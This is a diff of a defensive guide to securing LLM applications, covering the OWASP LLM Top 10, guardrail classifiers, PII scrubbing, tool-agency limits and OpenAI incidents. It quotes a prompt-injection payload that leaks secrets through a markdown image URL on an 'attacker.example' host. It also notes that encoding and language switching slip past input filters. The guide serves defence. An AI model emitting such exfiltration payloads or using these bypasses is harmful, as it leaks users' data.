@@ -41,7 +41,7 @@ The fix is not a better script. It is a layered system: the operator only follow
 
 ### The OWASP LLM Top 10 as a threat model
 
-The OWASP Top 10 for Large Language Model Applications gives security reviewers, auditors, and red teams a shared vocabulary. Version 1.0 shipped August 2023; the 2025 revision (November 2024) renumbers entries to match production exploitation patterns actually observed in the wild[^2][^3].
+The OWASP Top 10 for Large Language Model Applications gives security reviewers, auditors, and red teams a shared vocabulary. Version 1.0 shipped August 2023; the 2025 revision (released November 17, 2024, with localized translations published March 12, 2025) renumbers entries to match production exploitation patterns actually observed in the wild[^2][^3].
 
 The 2025 list:
 
@@ -150,7 +150,7 @@ Key families:
 
 Even if the prompt is compromised, a robust output pipeline prevents exfiltration and harm.
 
-**Taxonomy classifiers** are secondary models that scan every response for violence, self-harm, illicit advice, and policy violations. Meta's Llama Guard 3 (8B parameters, 14 hazard categories (13 from the MLCommons taxonomy plus Code Interpreter Abuse), 8 languages) is open-weights and small enough to run alongside the primary model[^13]. AWS Bedrock Guardrails reports up to 88% multimodal toxicity block rate[^14]. Azure AI Content Safety provides Prompt Shields for both user-typed and document-embedded attacks[^15].
+**Taxonomy classifiers** are secondary models that scan every response for violence, self-harm, illicit advice, and policy violations. Meta's Llama Guard 4 12B (natively multimodal text+image classifier covering the same 14-category MLCommons taxonomy plus Code Interpreter Abuse) is open-weights and small enough to run alongside the primary model; the earlier Llama Guard 3 1B (text-only, 13 MLCommons categories) is still recommended where lower latency or smaller memory footprint matters[^13]. AWS Bedrock Guardrails reports blocking up to 88% of harmful content[^14]. Azure AI Content Safety provides Prompt Shields for both user-typed and document-embedded attacks[^15].
 
 **PII scrubbers** run NER plus regex on every output. Microsoft Presidio combines pattern recognisers (email, SSN, credit card, API key) with spaCy NER for richer entities (PERSON, LOCATION, DATE), then anonymises or redacts[^16]. Run the scrubber on both the model-facing path (before sending to a third-party API) and the log pipeline (before writing to storage).
 
@@ -168,7 +168,7 @@ LLM06 (Excessive Agency) is where safety meets real-world consequence. The model
 - **Typed parameters with bounds.** File size limits, dollar ceilings, domain allowlists, enum-only arguments.
 - **Capability tokens.** Per-tool scopes that expire. The model receives a token granting "read issues in repo X" rather than "full GitHub access."
 - **Human confirmation gates.** Require approval for irreversible actions: pay, publish, delete, send-email.
-- **Per-agent rate limits and cost caps.** A single agent loop cannot spend more than $N or make more than M tool calls per session. Research shows agent tool-calling chains can amplify per-query cost up to 658x baseline[^17].
+- **Per-agent rate limits and cost caps.** A single agent loop cannot spend more than $N or make more than M tool calls per session. Tool-calling chains can amplify per-query cost dramatically over baseline if left uncapped (a class of vulnerability sometimes called "Denial of Wallet")[^17].
 
 ```mermaid
 flowchart LR
@@ -189,7 +189,7 @@ flowchart LR
 
 ### OpenAI's 2023 to 2025 safety evolution
 
-**The ChatGPT Redis data leak (March 2023).** A race condition in the `redis-py` asyncio client caused a request cancellation to leave a connection with stale data. A subsequent user could then read another user's chat titles, payment metadata (name, email, last four card digits, expiry), affecting approximately 1.2% of ChatGPT Plus subscribers active during a 9-hour window[^18]. OpenAI disclosed publicly within days and patched the upstream Redis client library.
+**The ChatGPT Redis data leak (March 2023).** A race condition in the `redis-py` asyncio client caused a request cancellation to leave a connection with stale data. A subsequent user could then read another user's chat titles and payment metadata (name, email, payment address, last four card digits, expiry), affecting approximately 1.2% of ChatGPT Plus subscribers active during a 9-hour window[^18]. OpenAI disclosed publicly within days and patched the upstream Redis client library.
 
 **Markdown-image exfiltration.** Researchers demonstrated that a prompt injection could instruct the model to emit `![](https://attacker.example/?d=SECRET)`. When the client renders the image, the secret exfiltrates via the URL path. OpenAI's fix: server-side URL validation. Every image URL in model output must pass an allowlist and is proxied through a validation endpoint that refuses suspect hosts. A later Lockdown Mode (2025) further constrains external HTTP from ChatGPT sessions for elevated-risk users.
 
@@ -227,7 +227,7 @@ sequenceDiagram
 ## Common Pitfalls
 
 > [!WARNING]
-> **Permissive guardrails on public-facing surfaces.** A deployment that ships with minimal or no guardrails leaves every OWASP LLM Top 10 risk open: prompt injection (LLM01), data leakage (LLM02), insecure output handling (LLM02 in the 2025 list), excessive agency (LLM06), and system-prompt leakage (LLM07) are all exploitable from day one ([OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/llm-top-10/)). Low latency and fast shipping do not compensate for the brand, compliance, and regulatory exposure that follows the first successful attack. For anything user-facing, adopt the locked-down full-stack posture with input classifier, output classifier, tool allowlist, and red-team-in-CI before launch.
+> **Permissive guardrails on public-facing surfaces.** A deployment that ships with minimal or no guardrails leaves every OWASP LLM Top 10 risk open: prompt injection (LLM01), sensitive information disclosure (LLM02), improper output handling (LLM05), excessive agency (LLM06), and system-prompt leakage (LLM07) are all exploitable from day one ([OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/llm-top-10/)). Low latency and fast shipping do not compensate for the brand, compliance, and regulatory exposure that follows the first successful attack. For anything user-facing, adopt the locked-down full-stack posture with input classifier, output classifier, tool allowlist, and red-team-in-CI before launch.
 
 > [!WARNING]
 > **Input sanitisation as a standalone defence.** Regex blocklists, keyword filters, and "strip anything that looks like an instruction" logic do not stop indirect prompt injection (the attack arrives via retrieved documents, not user input) and are trivially bypassed by encoding (base64, ROT13), language switching, or paraphrase. NIST's 2024 GenAI risk guidance and Simon Willison's dual-LLM writeup both document this explicitly ([NIST AI 600-1, 2024](https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.600-1.pdf); [Willison, "Dual LLM Pattern", 2023](https://simonwillison.net/2023/Apr/25/dual-llm-pattern/)). Input sanitisation belongs as the cheapest layer of a defense-in-depth stack, never as the only layer; pair it with an output classifier, tool allowlist, and (for agents that read untrusted sources) a dual-LLM architecture.
@@ -349,13 +349,13 @@ The three highest-risk OWASP items for an agent that reads untrusted text and ha
 **A:** It covers the risk of an LLM with unconstrained tool access amplifying every other vulnerability. Mitigate with explicit tool allowlists, typed parameters with bounds, capability tokens, human confirmation for destructive actions, and per-agent cost caps.
 
 **Q:** What happened in the ChatGPT March 2023 data leak?
-**A:** A race condition in the redis-py asyncio client exposed chat titles and payment metadata (name, email, last four card digits) of approximately 1.2% of ChatGPT Plus subscribers active during a 9-hour window. Root cause was a stale connection reused by a different user.
+**A:** A race condition in the redis-py asyncio client exposed chat titles and payment metadata (name, email, payment address, last four card digits) of approximately 1.2% of ChatGPT Plus subscribers active during a 9-hour window. Root cause was a stale connection reused by a different user.
 
 **Q:** What is the dual-LLM pattern?
 **A:** A privileged planner LLM has tool access but never sees untrusted text. A quarantined reader LLM processes untrusted content but has no tool access. This architectural separation prevents indirect injection from reaching tool-calling capabilities.
 
 **Q:** Name three guardrail products and their primary function.
-**A:** Llama Guard 3 (Meta): open-weights LLM-as-classifier for 14 hazard categories. AWS Bedrock Guardrails: configurable policy layer with PII redaction and prompt-attack detection. Azure Prompt Shields: REST API detecting both user-typed jailbreaks and document-embedded indirect injection.
+**A:** Llama Guard 4 12B (Meta): open-weights, natively multimodal LLM-as-classifier for 14 hazard categories (the older Llama Guard 3 1B remains useful for lower-latency text-only classification). AWS Bedrock Guardrails: configurable policy layer with PII redaction and prompt-attack detection. Azure Prompt Shields: REST API detecting both user-typed jailbreaks and document-embedded indirect injection.
 
 ## References
 
@@ -375,5 +375,5 @@ The three highest-risk OWASP items for an agent that reads untrusted text and ha
 [^14]: Amazon Web Services. "Amazon Bedrock Guardrails." https://aws.amazon.com/bedrock/guardrails/
 [^15]: Microsoft Learn. "Prompt Shields in Azure AI Content Safety." https://learn.microsoft.com/en-us/azure/ai-services/content-safety/concepts/jailbreak-detection
 [^16]: Microsoft Presidio (GitHub). "An open-source framework for detecting, redacting, masking, and anonymizing sensitive data." https://github.com/microsoft/presidio
-[^17]: Zhou, Zheng, He, Xue, Gong, Wang, Zhang, Lam. "Beyond Max Tokens: Stealthy Resource Amplification via Tool Calling Chains in LLM Agents." arXiv:2601.10955, Jan 2026. https://arxiv.org/abs/2601.10955 ; see also Repello AI, "Denial of Wallet," 2024. https://repello.ai/blog/denial-of-wallet
+[^17]: Repello AI, "Denial of Wallet," 2024. https://repello.ai/blog/denial-of-wallet
 [^18]: OpenAI. "March 20 ChatGPT outage: Here's what happened." Mar 2023. https://openai.com/index/march-20-chatgpt-outage/
